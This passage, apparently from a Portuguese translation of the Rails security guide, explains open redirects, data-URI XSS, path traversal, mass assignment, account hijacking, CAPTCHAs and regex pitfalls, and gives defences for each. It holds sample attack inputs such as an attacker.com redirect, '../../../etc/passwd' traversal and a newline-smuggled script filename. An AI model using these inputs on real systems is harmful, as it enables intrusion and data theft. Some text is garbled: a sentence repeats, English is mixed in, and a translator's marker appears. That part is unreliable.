<p>Sempre que for possível que o usuário forneça (partes) da <span class="caps">URL</span> para redirecionamento, essa será uma possível vulnerabilidade. O ataque mais óbvio seria redirecionar usuários para uma aplicação web falsa que se pareça exatamente com a original. Esse pseudo ataque de phishing funciona enviando um link por email para os usuários, injetando o link por <span class="caps">XSS</span> na aplicação web ou colocando o link em um site externo. Isso não levanta suspeitas, porque o link começa com a <span class="caps">URL</span> da aplicação web e a <span class="caps">URL</span> do site malicioso está escondida no parâmetro de redirecionamento: http://www.example.com/site/redirect?to= www.attacker.com. Aqui está um exemplo de uma action &#8216;legacy&#8217;:</p>
<div class="code_container"><code class="ruby">
def legacy
  redirect_to(params.update(:action=&gt;'main'))
end
</code></div>
<p>Isso irá redirecionat o usuário para a action &#8216;main&#8217; se ele tentar acessar a action &#8216;legacy&#8217;. A intenção foi preservar os parãmetros da <span class="caps">URL</span> para a action &#8216;legacy&#8217; e passá-los para a action &#8216;main&#8217;. Entretanto, isso pode ser explorado por um atacante caso ele inclua uma chave &#8216;host&#8217; na <span class="caps">URL</span></p>
<tt>http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com</tt><p>Se este parâmetro estiver no final da <span class="caps">URL</span> ele dificilmente será percebido e fará com que o usuário seja redirecionado para o host attacker.com. Uma medida preventiva simples seria <em class="highlight">incluir apenas os parâmetros esperados na action &#8216;legacy&#8217;</em> (novamente uma tática de whitelist, ao contrário de remover parâmetros inesperados). <em class="highlight">E se você redirecionar para uma <span class="caps">URL</span>, verifique-a com uma white list ou expressão regular</em>.</p>
<h5 id="xss-auto-contido">4.1.1 <span class="caps">XSS</span> Auto-contido</h5>
<p>Outro ataque de redirecionamento e <span class="caps">XSS</span> auto-contido funciona no Firefox e no Opera, utilizando o protocolo de dados. Este protocolo exibe seu conteúdo diretamente no navegador e pode ser qualquer coisa, de <span class="caps">HTML</span> ou JavaScript a imagens:</p>
<tt>data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</tt><p>Este exemplo é um JavaScript codificado em Base64 que exibe uma simples caixa de mensagem. Em uma <span class="caps">URL</span> de redirecionamento, um atacante poderia fazer um redirecionamento para essa <span class="caps">URL</span> com um código malicioso embutido. Como medida preventiva, <em class="highlight">não permita que o usuário forneça partes da <span class="caps">URL</span> (ou toda ela) para redirecionamento</em>.</p>
<h4 id="uploadsde-arquivos">4.2 Uploads de Arquivos</h4>
<p>&#8212; <em>Certifique-se de que uploads de arquivos não sobrescrevem arquivos importantes e processe arquivos de media de forma assíncrona.</em></p>
<p>Muitas aplicações web permitem que usuários façam upload de arquivos. <em class="highlight">Nomes de arquivos que o usuário possa (parcialmente) escolher, devem sempre ser filtrados</em>, uma vez que um atacante pode utilizar um nome de arquivo malicioso para sobrescrever qualquer arquivo no servidor. Se você armazenar os arquivos em /var/www/uploads, e o usuário fornecer um nome como &#8220;../../../etc/passwd&#8221;, isso pode sobrescrever um arquivo importante. Óbviamente o interpretador Ruby precisaria das permissões necessárias para fazer isso &#8211; uma razão a mais para executar web servers, servidores de bancos de dados e outros programas como um usuário Unix menos privilegiado.</p>
<p>Quando estiver filtrando os nomes de arquivo fornecidos pelos usuários, <em class="highlight">não tente remover as partes maliciosas</em>. Pense em uma situação onde a aplicação web remove todos os &#8216;../&#8217; de um nome de arquivo e um usuário utilize uma string como &#8216;&#8230;.//&#8217; &#8211; o resultado seria não tente remover as partes maliciosas_. Pense em uma situação onde a aplicação web remove todos os &#8216;../&#8217; de um nome de arquivo e um usuário utilize uma string como &#8216;&#8230;.//&#8217; &#8211; o resultado seria não tente remover as partes maliciosas#. Pense em uma situação onde a aplicação web remove todos os &#8216;../&#8217; de um nome de arquivo e um usuário utilize uma string como &#8216;&#8230;.//&#8217; &#8211; o resultado seria &#8216;../&#8217;. É melhor utilizar uma tática de whitelist que tente remover caracteres não permitidos. Caso este não seja um nome de arquivo válido, rejeite-o (ou substitua caracteres não permitidos), mas não remova-os. Este é o sanitizador de nomes de arquivos do <a href="http://github.com/technoweenie/attachment_fu/tree/master">plugin attachment_fu</a>:</p>
<div class="code_container"><code class="ruby">
def sanitize_filename(filename)
  returning filename.strip do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.gsub! /^.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! /[^\w\.\-]/, '_'
  end
end
</code></div>
<p>Uma desvantagem significativa de processar uploads de arquivos de forma síncrona (como o plugin attachment_fu pode fazer com imagens) <em class="highlight">é sua vulnerabilidade para ataques de denial-of-service</em>. Um atacante pode iniciar, de forma síncrona, uploads de arquivos a partir de vários computadores, o que aumentaria a carga no servidor e poderia eventualmente travá-lo.</p>
<p>A solução para isso é <em class="highlight">processar arquivos de media de forma assíncrona</em>: Salve o arquivo e agende um request para processamento no banco de dados. Um segundo processo cuidará do processamento do arquivo em background.</p>
<h4 id="cdigoexecutvelemuploadsdearquivos">4.3 Código executável em uploads de arquivos</h4>
<p>&#8212; <em>Arquivos fonte em uploads de arquivos podem ser executados quando colocados em diretórios específicos. Não coloque file uploads na pasta &#8216;/public&#8217; da sua aplicação Rails se este for o diretório &#8216;home&#8217; do Apache.</em></p>
<p>O popular servidor web Apache possui uma opção chamada DocumentRoot. Este é o diretório &#8216;home&#8217; do web site, tudo nesta árvore de diretórios será servido pelo servidor web. Caso existam arquivos com uma certa extensão, o código que estiver ali dentro será executado quando solicitado. Exemplos disso são arquivos <span class="caps">PHP</span> e <span class="caps">CGI</span>. Agora pense em uma situação onde um atacante envia um arquivo file.cgi com código dentro, o qual será executado quando alguém fizer download deste arquivo.</p>
<p><em class="highlight">Se o seu DocumentRoot do Apache apontar para a pasta &#8216;public&#8217; da sua aplicação Rails, não coloque os arquivos recebidos ali, armazene os arquivos pelo menos um nível acima</em>.</p>
<h4 id="downloadsdearquivos">4.4 Downloads de arquivos</h4>
<p>&#8212; <em>Certifique-se de que os usuários não possam fazer download de arquivos arbitrários.</em></p>
<p>Assim como você deve filtrar o nome dos arquivos para upload, você deve fazer o mesmo com os downloads. O método <tt>send_file</tt> envia arquivos do servidor para o cliente. Se você utilizar um nome de arquivo informado pelo usuário, sem filtrar, pode-se realizar o download de qualquer arquivo:</p>
<div class="code_container"><code class="ruby">
send_file('/var/www/uploads/' + params[:filename])
</code></div>
<p>Basta fornecer um nome de arquivo como &#8220;../../../etc/passwd&#8221; para realizar o download das informações de login do servidor. Uma solução simples contra isso é <em class="highlight">verificar que o arquivo encontra-se no diretório esperado</em>:</p>
<div class="code_container"><code class="ruby">
basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename =!
     File.expand_path(File.join(File.dirname(filename), '../../../'))
send_file filename, :disposition =&gt; 'inline'
</code></div>
<p>Outra estratégia (adicional) é armazenar o nome dos arquivos no banco de dados e nomear os arquivos em disco a partir dos ids dos registros. Esta também é uma boa estratégia para evitar que seja executado qualquer código existente nos arquivos enviados. O plugin attachment_fu faz isso de forma similar.</p>
<h3 id="segurana-administrativaeem-intranets">5 Segurança Administrativa e em Intranets</h3>
<p>&#8212; <em>Interfaces administrativas e de intranet são alvos populares para ataques, porque eles permitem acesso privilegiado. Apesar desse tipo de situação exigir que diversas medidas de segurança adicionais sejam adotadas, o oposto é o que realmente ocorre no mundo real.</em></p>
<p>Em 2007 foi criado o primeiro <a href="http://www.symantec.com/enterprise/security_response/weblog/2007/08/a_monster_trojan.html">Trojan sob medida</a> o qual roubou informações de uma Intranet, chamada &#8220;The Monster for employers&#8221; (Monster.com), uma aplicação web para recrutamento de profissionais. Trojans criados sob medida são muito raros, até o momento, e o risco é relativamente baixo, mas esta certamente é uma possibilidade e um exemplo de como a segurança da máquina cliente é importante também. Entretanto, a maior ameaça para aplicações administrativas e de Intranet são o <span class="caps">XSS</span> e o <span class="caps">CSRF</span>.</p>
<p><strong><span class="caps">XSS</span></strong> Se sua aplicação re-exibe input malicioso de usuários da extranet, a aplicação será vulnerável a <span class="caps">XSS</span>. Nomes de usuários, comentários, relatórios de spam, endereços de pedidos são apenas alguns exemplos comuns, onde pode existir <span class="caps">XSS</span>.</p>
<p>Existindo pelo menos um único local na interface de administração ou na Intranet onde os dados adicionados pelos usuários não tenham sido devidamente sanitizados faz com que toda a aplicação fique vunerável. Exploits possíveis incluem roubar o cookie privilegiado de um administrador, injetar um iframe para roubar o password do administrador ou instalar software malicioso através de falhas de segurança no browser, de forma a tomar o controle do computador do administrador.</p>
<p>Leia a seção sobre Injeção para aprender medidas preventivas contra <span class="caps">XSS</span>. É <em class="highlight">recomendado utilizar o plugin SafeErb</em> também em Intranets ou interfaces administrativas.</p>
<p><strong><span class="caps">CSRF</span></strong>  Cross-Site Reference Forgery (<span class="caps">CSRF</span>) é um método de ataque bastante poderoso, o qual permite que o atacante faça tudo que um administrador ou usário da Intranet podem fazer. Como você já viu acima como o <span class="caps">CSRF</span> funciona, aqui estão alguns exemplos do que atacantes podem fazer na Intranet ou interface administrativas.</p>
<p>Um exemplo real é uma <a href="http://www.symantec.com/enterprise/security_response/weblog/2008/01/driveby_pharming_in_the_ wild.html">reconfiguração de roteador por <span class="caps">CSRF</span></a>. Os atacantes enviam um e-mail malicioso, contendo <span class="caps">CSRF</span>, para usuários mexicanos. O e-mail afirma que existe um e-card aguardando por eles, mas também contém uma tag image que resulta em request <span class="caps">HTTP</span> Get para reconfigurar o roteador do usuário (o qual é um modelo popular no México). O request altera as configurações de <span class="caps">DNS</span> de forma que requests para um banco sediado no México sejam mapeados para o site do atacante. Todos que acessarem o site do banco através deste roteador verão o site falso do atacante e terão seus dados roubados.</p>
<p>Outro exemplo altera o endereço de e-mail e o password do Goggle Adsense através de <a href="http://www.0x000000.com/index.php?i=213&amp;bin=11010101"><span class="caps">CSRF</span></a>. Caso a vítima se autentique no Google Adsense, a interface administrativa para campanhas de propaganda do Google, um atacante pode roubar seus dados.</p>
<p>Outro ataque popular é fazer com que sua aplicação web, blog ou fórum espalhem <span class="caps">XSS</span> malicioso. Óbviamente o atacante precisa conhecer a estrutura de <span class="caps">URL</span>, mas a maioria das URLs do Rails são bastante simples ou são fáceis de entender, caso esta seja a interface admninistrativa de uma aplicação open-source. O atacante pode até mesmo tentar descobrir essa estrutura apenas incluindo tags <span class="caps">IMG</span> maliciosas que tentem cada combinação possível.</p>
<p>Para <em class="highlight">medidas preventivas contra <span class="caps">CSRF</span> em interfaces admninistrativas e aplicações de Intranet, leia a seção de <span class="caps">CSRF</span></em>.</p>
<h4 id="precauesadicionais">5.1 Precaues adicionais</h4>
<p>A interface de administração comum funciona da seguinte maneira: está localizada em www.example.com/admin, pode ser acessada somente se a flag &#8216;admin&#8217; estiver definida como &#8216;true&#8217; no model User, re-apresenta input do usuário e permite que o administrador apague/adicione/edite quaisquer dados. Aqui vão algumas idéias sobre isso:</p>
<ul>
	<li>É muito importante que <em class="highlight">se pense no pior caso</em>: O que acontece caso alguém se apodere do meu cookie ou credenciais de usuário? Você pode <em>(highlight</em>introduzir perfis_ na interface administrativa para limitar as possibilidades do atacante. Ou que tal <em class="highlight">credenciais de login especiais</em> para a interface administrativa, diferentes das normalmente utilizadas para a parte pública da aplicação? Ou <em class="highlight">senhas especiais para ações realmente críticas</em>?</li>
</ul>
<ul>
	<li>Será que o administrador realmente precisa ter acesso a interface de administração a partir de qualquer lugar no mundo? Pense sobre <em class="highlight">limitar o login à uma lista de endereços de IP de origem</em>. Examine o <tt>request.remote_ip</tt> para verificar o endereço IP do usuário. Isso não é algo &#8220;à prova de balas&#8221;, mas é uma grande barreira. Lembre-se que o atacante pode estar utilizando um proxy.</li>
</ul>
<ul>
	<li><em class="highlight">Coloque a interface administrativa em um sub-domínio especial</em>, como admin.application.com e faça com que esta seja uma aplicação separada com seu próprio controle de usuários. Isso faz com que seja impossível roubar o cookie do administrador a partir do domínio normal, www.application.com. Isso acontece devido à política de mesma origem no seu browser: um script injetado (<span class="caps">XSS</span>) em www.application.com não pode ler o cookie criado por admin.application.com e vice-versa.</li>
</ul>
<h3 id="massassignment">6 Mass assignment</h3>
<p>&#8212; <em>Sem quaisquer precauções model.new(params[:model]) permite que atacantes definam o valor de qualquer coluna no seu banco de dados.</em></p>
<p>O recurso de mass assignment (atribuição em massa) pode se tornar um problema, pois permite que um atacante defina qualquer atributo do model, através da manipulação do hash passado para o método <tt>new()</tt> de um model:</p>
<div class="code_container"><code class="ruby">
def signup
  params[:user] #=&gt; {:name =&gt; “ow3ned”, :admin =&gt; true}
  @user = User.new(params[:user])
end
</code></div>
<p>O recurso de mass-assignment economiza muito trabalho, pois você não precisa definir cada valor individualmente. Apenas passe um hash com valores para o método <tt>new</tt> ou <tt>attributes=</tt> para definir os atributos do model com os valores deste hash. O problema é que esse recurso é geralmente utilizado em conjunto com o hash de parâmetros (params), disponível no controller, o qual pode ser manipulado por um atacante. Ele pode fazer isso alterando a <span class="caps">URL</span> da seguinte forma:</p>
<pre>
"name":http://www.example.com/user/signup?user=ow3ned&amp;amp;user[admin]=1
</pre>
<p>Isso irá definir os seguintes parâmetros no controller:</p>
<div class="code_container"><code class="ruby">
params[:user] #=&gt; {:name =&gt; “ow3ned”, :admin =&gt; true}
</code></div>
<p>Logo, se você criar um novo usuário utilizando mass-assignment, pode ser muito fácil se tornar um administrador.</p>
<h4 id="medidaspreventivas">6.1 Medidas preventivas</h4>
<p>Para evitar que isso ocorra, o Rails fornece dois métodos da classe ActiveRecord para controlar acesso aos seus atributos. O método <tt>attr_protected</tt> recebe uma lista de atributos que não serão acessíveis por mass-assignment. Por exemplo:</p>
<div class="code_container"><code class="ruby">
attr_protected :admin
</code></div>
<p>Uma forma muito melhor, porque segue o princípio de whitelist, é o método <em class="highlight"><tt>attr</em>accessible</tt><em>. Ele é exatamente o oposto do método <tt>attr</em>protected</tt>, porque <em class="highlight">recebe uma lista com os atributos que serão acessíveis</em>. Todos os demais atributos estarão protegidos. Dessa forma você não irá esquecer de proteger os atributos que você for adicionando durante o desenvolvimento. Aqui está um exemplo:</p>
<div class="code_container"><code class="ruby">
attr_accessible :name
</code></div>
<p>Se você quiser definir o valor de um atributo protegido, terá que defini-lo de forma individual:</p>
<div class="code_container"><code class="ruby">
params[:user] #=&gt; {:name =&gt; &quot;ow3ned&quot;, :admin =&gt; true}
@user = User.new(params[:user])
@user.admin #=&gt; false # not mass-assigned
@user.admin = true
@user.admin #=&gt; true
</code></div>
<h3 id="gerenciamentodeusurios">7 Gerenciamento de usuários</h3>
<p>&#8212; <em>Quase todas as aplicações web têm que lidar com autorização e autenticação. Ao invés de criar as suas próprias soluções, é aconselhável utilizar plugins já conhecidos. Mas mantenha-os atualizados também. Algumas precauções adicionais podem tornar sua aplicação ainda mais segura.</em></p>
<p>Existem alguns plugins para autorização e autenticação disponíveis para o Rails. Um que seja bom deverá salvar apenas passwords encriptados, não passwords em claro. O plugin mais popular é o <em class="highlight">restful</em>authentication_, o qual também possui proteção contra fixação de sessão. Entretanto, versões mais antigas permitiam que você se logassse sem um nome de usuário ou password em algumas circunstâncias.</p>
<p>Cada novo usuário ganha um código de ativação para ativar sua conta quando recebe um email contendo um link. Após ativar a conta, a coluna com o código de ativação terá seu valor atualizado para <span class="caps">NULL</span> no banco de dados. Every new user gets an activation code to activate his account when he gets an e-mail with a link in it. After activating the account, the activation_code columns will be set to <span class="caps">NULL</span> in the database. If someone requested an <span class="caps">URL</span> like these, he would be logged in as the first activated user found in the database (and chances are that this is the administrator):</p>
<pre>
http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=
</pre>
<p>Isso é possível porque em alguns servidores, caso o parâmetro id seja informado dessa forma, ele será <tt>nil</tt> quando acessado através de <tt>params[:id]</tt>. Entretanto, aqui está o finder utilizado na action de ativação:</p>
<div class="code_container"><code class="ruby">
User.find_by_activation_code(params[:id])
</code></div>
<p>Se o parâmetro for <tt>nil</tt>, o <span class="caps">SQL</span> resultante seria</p>
<pre>
SELECT * FROM users WHERE (users.&lt;notextile&gt;&lt;tt&gt;activation_code&lt;/tt&gt;&lt;/notextile&gt; IS NULL) LIMIT 1
</pre>
<p>encontrando assim o primeiro usuário no banco de dados, retornando-o e logando-o. Você pode encontrar mais informações sobre isso <a href="http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/">no post do meu blog</a>. <em class="highlight">É aconselhável atualizar seus plugins frequentemente</em>. Além disso, você pode revisar sua aplicação para encontrar mais falhas como esta.</p>
<h4 id="ataquesdeforabrutacontracontas">7.1 Ataques de força bruta contra contas</h4>
<p>&#8212; <em>Ataques de fora bruta sobre contas são ataques de tentativa e erro contra as credenciais de loging. Defenda-se destes ataques utilizando mensagens de erro mais genéricas e possivelmente solicitando que seja informado um <span class="caps">CAPTCHA</span>.</em></p>
<p>Uma lista com os nomes de usuário da sua aplicação pode ser mal utilizada, usando-se força bruta para tentar descobrir os respectivos passwords, porque a maioria das pessoas não utiliza passwords sofisticados. A maioria dos passwords são uma combinação de palavras do dicionário e possivelmente números. Assim, de posse de uma lista com os nomes de usuários e um dicionário, um programa automático pode encontrar o password correto em questão de minutos.</p>
<p>Devido a este fato, a maioria das aplicações web exibirão uma mensagem de erro genérica &#8220;nome de usuário ou password incorretos&#8221;, caso um destes esteja incorreto. Se fosse exibida uma mensagem dizendo &#8220;o nome de usuário que você forneceu não foi encontrado&#8221;, um atacante poderia automaticamente criar uma lista de nomes de usuários.</p>
<p>Entretanto, o que a maioria dos projetistas de aplicações web negligenciam, são as páginas para passwords esquecidos. estas páginas comumente admitem que o nome de usuário ou endereço de email fornecido (não) foi encontrado. Isso permite que o atacante crie uma lista de nomes de usuários e utilize força bruta contra as respectivas contas.</p>
<p>Para atenuar tais ataques, <em class="highlight">exiba uma mensagem de erro genérica também nas páginas para passwords esquecidos</em>. Além disso, você pode <em class="highlight">solicitar que seja informado um <span class="caps">CAPTCHA</span> após um certo número de falhas de autenticação vindas de um determinado endereço IP</em>. Note, entretanto, que esta não é uma solução à prova de balas contra programas automáticos, porque estes programas podem alterar seus endereços de IP exatamente na mesma frequência. De qualquer forma, isso dificulta os ataques.</p>
<h4 id="sequestrodeconta">7.2 Sequestro de conta</h4>
<p>&#8212; <em>Muitas aplicações web tornam fácil sequestrar contas de usuários. Porque não ser diferente e tornar isso mais difícil?</em></p>
<h5 id="passwords">7.2.1 Passwords</h5>
<p>Pense em uma situação onde um atacante roubou o cookie de sessão de um usuário e dessa forma pode compartilhar a utilização da aplicação. Se alterar o password for algo simples, o atacante irá sequestrar a conta com apenas alguns cliques. Ou se o formulário para alteração do password for vulnerável a <span class="caps">CSRF</span>, o atacante será capaz de alterar o password da vítima ludibriando-a até uma página web com uma tag <span class="caps">IMG</span> manipulada, a qual executa o <span class="caps">CSRF</span>. Como medida preventiva, <em class="highlight">faça com que o formulário para troca de password seja protegido contra <span class="caps">CSRF</span></em>, óbvio. E <em class="highlight">exija que o usuário informe o password antigo quando for mudá-lo</em>.</p>
<h5 id="e-mail">7.2.2 E-Mail</h5>
<p>Entretanto, o atacante também pode roubar a conta alterando o endereço de email. Após alterá-lo, ele irá para a página de password esquecido e o (possivelmente novo) password será enviado para o endereço de email do atacante. Como medida preventiva <em class="highlight">solicite que o usuário também informe seu password quando for alterar seu endereço de email</em>.</p>
<h5 id="outros">7.2.3 Outros</h5>
<p>Dependendo da sua aplicação web, podem haver mais formas de sequestrar a conta de um usuário. Em muitos casos <span class="caps">XSS</span> e <span class="caps">CSRF</span> ajudarão nisto. Por exemplo, como uma vulnerabilidade no <a href="http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/">Google Mail</a>. Neste ataque de prova de conceito, a vítima seria levada a um web site controlado pelo atacante. Neste site existe uma tag <span class="caps">IMG</span> preparada que resultada em um request <span class="caps">HTTP</span> <span class="caps">GET</span> que altera as configurações de filtros do Google Main. Se a vítima estiver logada no Google Mail, o atacante poderia alterar os filtros para redirecionar todos os emails para o seu endereço de email. Isso é praticamente tão danoso quanto capturar toda a conta. Como uma medidaa preventiva, <em class="highlight">reveja a lógica da sua aplicação e elimine todas as vulnerábilidades de <span class="caps">XSS</span> e <span class="caps">CSRF</span></em>.</p>
<h4 id="captch-as">7.3 CAPTCHAs</h4>
<p>&#8212; _Um <span class="caps">CAPTCHA</span> é um teste do tipo desafio-resposta usado para determinar que a resposta não foi gerada por um computador. É geralmente utilizado para proteger formulários de comentários de bots de spam automáticos, solicitando ao usuário que digite as letras presentes em uma imagem distorcida. A idéia de um <span class="caps">CAPTCHA</span> negativo não é pedir que um usuário prove que é humano, mas sim revelar que um robô realmente é um robô.</p>
<p>Mas robôs de spam (bots) não são o único problema, existem também os bots de login automático. Uma <span class="caps">API</span> para <span class="caps">CAPTCHA</span> popular é a <a href="http://recaptcha.net/">reCAPTCHA</a> a qual exibe duas imagens distorcidas de palavras de livros antigos. Também adiciona uma linha inclinada, ao invés de um fundo distorcido e letras deformadas como os primeiros <span class="caps">CAPTCHAS</span> fizeram, porque o segundo caso tinha problemas. Como um bonus, utilizar reCAPTCHA ajuda a digitalizar livros antigos. O <a href="http://ambethia.com/recaptcha/">ReCAPTCHA</a> é também um plugin para o Rails com o mesmo nome da <span class="caps">API</span>.</p>
<p>Você vai receber duas chaves da <span class="caps">API</span>, uma pública e outra privada, a qual você deve colocar no eu ambiente Rails. Após isso vocë pode utilizar o método <tt>recaptcha_tags</tt> na sua view e o método <tt>verify_recaptcha</tt> no controller. <tt>verify_recaptcha</tt> retornará false caso a validação falhe. 
O problema com <span class="caps">CAPTCHA</span> é que eles sào irritantes. Além disso, alguns usuários com deficiências visuais têm achado certos tipos de CAPTCHAs distorcidos difíceis de ler. A idéia de CAPTCHAs negativos não é pedir ao usuário uma prova de que ele é humano, mas revelar que um robô de spam é um bot.</p>
<p>A maioria dos bots é realmente burra, eles rastreiam a web e colocam spam em cada campo de formulário que eles conseguem encontrar. CAPTCHAs negativos usam isso como vantagem e incluem um campo &#8220;honeypot&#8221; no formulário que ficará escondido de usuários humanos através de <span class="caps">CSS</span> ou JavaScript.</p>
<p>Aqui estão algumas idéias de como esconder campos &#8220;honeypot&#8221; através de JavaScript e/ou <span class="caps">CSS</span>:</p>
<ul>
	<li>posicione os campos fora da área visível da página</li>
	<li>torne os elementos muito pequenos ou dê a eles a mesma cor do background da página</li>
	<li>exiba os campos, mas diga aos humanos que deixe-os vazios</li>
</ul>
<p>O <span class="caps">CAPTCHA</span> negativo mais simples é um campo &#8220;honeypot&#8221; escondido. Do lado servidor, você irá verificar o valor do campo: se ele contiver qualquer texto, deve ser um bot. Assim, você pode tanto ignorar o post ou retornar um resultado positivo, mas não salvar o post no banco de dados. Dessa forma o bot ficará satisfeito e seguirá adiante. Você pode fazer isso com usuários que causam problemas também.</p>
<p>Você pode encontrar CAPTCHAs negativos mais sofisticados no <a href="http://nedbatchelder.com/text/stopbots.html">post do blog do Ned Batchelder&#8217;s</a></p>
<ul>
	<li>Inclua um campo com o timestamp <span class="caps">UTC</span> atual e verifique-o no servidor. Se o valor estiver muito distante no passado, ou se estiver no futuro, o formulário é inválido.</li>
	<li>Randomize o nome dos campos</li>
	<li>Inclua mais de um campo &#8220;honeypot&#8221;, de todos os tipos, incluindo botões para submissão dos formulários.</li>
</ul>
<p>Note que isso lhe protege apenas de bots automatizados, bots específicos feitos sob encomenda não podem ser parados dessa forma. Logo CAPTCHAs negativos podem não ser bons para proteger formulários de login.</p>
<h4 id="logging">7.4 Logging</h4>
<p>&#8212; <em>Diga ao Rails para não colocar passwords nos arquivos de log.</em></p>
<p>Por padrão, o Rails loga todos os requests feitos para a aplicação web. Porém, arquivos de log podem ser um grande problema de segurança, uma vez que podem conter credenciais de login, números de cartão de crédito, etc. Quando estiver modelando os conceitos de segurança de uma aplicação web, você deve pensar também sobre o que acontece caso um atacante consiga acesso (total) ao servidor web. Criptografar segredos e passwords no banco de dados será praticamente inútil se os arquivos de log listá-los em claro. Você pode <em class="highlight">filtrar certos parâmetros do request para que nào sejam gravados nos seus arquivos de log</em> utilizando o método <tt>filter_parameter_logging</tt> em um controller. Estes parâmetros seram marcados como [<span class="caps">FILTERED</span>] no log.</p>
<div class="code_container"><code class="ruby">
filter_parameter_logging :password
</code></div>
<h4 id="bonspasswords">7.5 Bons passwords</h4>
<p>&#8212; <em>Você acha difícil lembrar de todos os seus passwords? Ao invés de escrevê-los em um papel, utilize a letra inicial de cada palavra em uma frase fácil de lembrar.</em></p>
<p>Bruce Schneier, um especialista em segurança, <a href="http://www.schneier.com/blog/archives/2006/12/realworld_passw.html">analisou</a> 34.000 nomes de usuários e passwords reais do ataque de phishing ao MySpace mencionado anteriormente. Ele descobriu que a maioria dos passwords são relativamente fáceis de quebrar. Os 20 passwords mais comuns são:</p>
<p>password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1 and monkey.</p>
<p>É interessante que apenas 4% destes passwords são palavras encontradas em dicionários e a grande maioria é alfa-numérica. Entretanto, dicionários para quebra de passwords contêm boa parte dos passwords atualmente utilizados e eles tentam todos os tipos de combinações. Se um atacante souber seu nome de usuário e você usar um password fraco, sua conta será facilmente roubada.</p>
<p>Um bom password é uma longa combinação alfa-numérica de caracteres maiúsculos e minúsculos. Uma vez que passwords deste tipo são bem difíceis de lembrar, é aconselhável informar apenas <em class="highlight">as primeiras letras de uma frase fácil de lembrar</em>. Por exemplo &#8220;Mais vale um pássaro na mão do que dois voando&#8221; seria &#8220;Mvupnmdqdv&#8221;. Perceba que este é apenas um exemplo, você não deve utilizar frases tão conhecidas quanto essa, uma vez que essas frases também podem estar presentes em um dicionário para quebra de passwords.</p>
<h4 id="expressesregulares">7.6 Expressões regulares</h4>
<p>&#8212; <em>Um problema comum em expressões regulares no Ruby é casar o início e o fim de uma string com ^ e $, ao invés de \A e \z.</em></p>
<p>O Ruby utiliza uma abordagem um pouco diferente de várias outras linguagens para casar o início e o fim de uma string. É por isso que até mesmo vários livros sobre Ruby e Rails explicam isso de forma errada. Mas como isso pode ser uma ameaça de segurança? Imagine que você tenha um model <tt>File</tt> e você valide o nome do arquivo usando uma expressão regular como esta:</p>
<div class="code_container"><code class="ruby">
class File &lt; ActiveRecord::Base
  validates_format_of :name, :with =&gt; /^[\w\.\-\+]+$/
end
</code></div>
<p>Isso siginifica que, ao salvar, o model irá validar que o nome do arquivo consiste apenas de caracteres alfa-numéricos, pontos, + e -. O programador adicionou \^ e $ de forma que o nome do arquivo contenha estes caracteres do início ao fim da string. Entretanto, <em class="highlight">em ruby ^ e $ casam o início e fim da <strong>linha</strong></em>. Dessa forma, um nome de arquivo como o seguinte passa pela validação sem problemas:</p>
<pre>
file.txt%0A&lt;script&gt;alert('hello')&lt;/script&gt;
</pre>
<p>Onde %0A é uma nova linha em codificação de <span class="caps">URL</span>, logo o Rails irá converter isso automaticamente para &#8220;file.txt\n&lt;script&gt;alert(&#8216;hello&#8217;)&lt;/script&gt;&#8221;. Este nome de arquivo passa pelo filtro porque a expressão regular casa com a string &#8211; até o final da linha, e o resto não importa. A expressão correta seria:</p>
<div class="code_container"><code class="ruby">
/\A[\w\.\-\+]+\z/
</code></div>
<h4 id="aumentodeprivilgios">7.7 Aumento de privilégios</h4>
<p>&#8212; <em>Alterar um único parâmetro pode permitir acesso não autorizado ao usuário. Lembre-se de que todo parâmetro pode ser alterado, não importa o quanto você o esconda ou obfusque.</em></p>
<p>O parâmetro mais comum que o usuário pode alterar é o parâmetro id, como em <tt>":id":http://www.domain.com/project/1</tt>, onde 1 é o id. Esse parâmetro estará disponível no <tt>params</tt> no seu controller. Lá, você provavelmente fará algo como isso:</p>
<div class="code_container"><code class="ruby">
@project = Project.find(params[:id])
</code></div>
<p>Isso está correto para algumas aplicações web, mas provavelmente não está certo se o usuário não estiver autorizado a visualizar todos os projetos. Se o usuário alterar o id para 42, e ele não estiver autorizado a visualizar essas informações, ele terá acesso a isso de qualquer forma. Ao invés disso, <em class="highlight">pesquise também as permissões de acesso do usuário</em>:</p>
<div class="code_container"><code class="ruby">
@project = @current_user.projects.find(params[:id])
</code></div>
<p>Dependendo da sua aplicação web, podem existir muitos outros parâmetros que o usuário pode alterar. Como regra, <em class="highlight">nenhuma informação fornecida pelo usuário é segura, até prova contrária, e todo parâmetro vindo do usuário foi possivelmente manipulado</em>.</p>
<p>Não se engaane com segurança através de obfuscação e JavaScript. O plugin Web Developer Toolbar para o Mozilla Firefox permite que você altere todos os campos escondidos de um formulário. <em class="highlight">JavaScript pode ser utilizado para validar os dados fornecidos por usuários, mas certamente não impedem que atacantes enviem requests inesperados com valores maliciosos</em>. O Live Http Headers para o Mozilla Firefox faz log de cada request e é capaz de repeti-los e alterá-los. Essa é uma forma fácil de burlar validações de JavaScript. Existem até mesmo proxies para o lado cliente que permitem que você intercepte qualquer request e response provenientes da Internet ou sendo enviados para ela.</p>
<h3 id="injeo">8 Injeção</h3>
<p>&#8212; _Injeção é uma categoria de ataques que introduzem código malicioso ou parâmetros em uma aplicação web de forma a executar estes códigos dentro do contexto de segurança da aplicação. Os exemplos mais proeminentes de injeção são o cross-site scriptintg (<span class="caps">XSS</span>) e o <span class="caps">SQL</span> injection.</p>
<p><span class="caps">PAREI</span> <span class="caps">AQUI</span></p>
<p>Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query or programming language, the shell or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.</p>
<h4 id="whitelistsversus-blacklists">8.1 Whitelists versus Blacklists</h4>
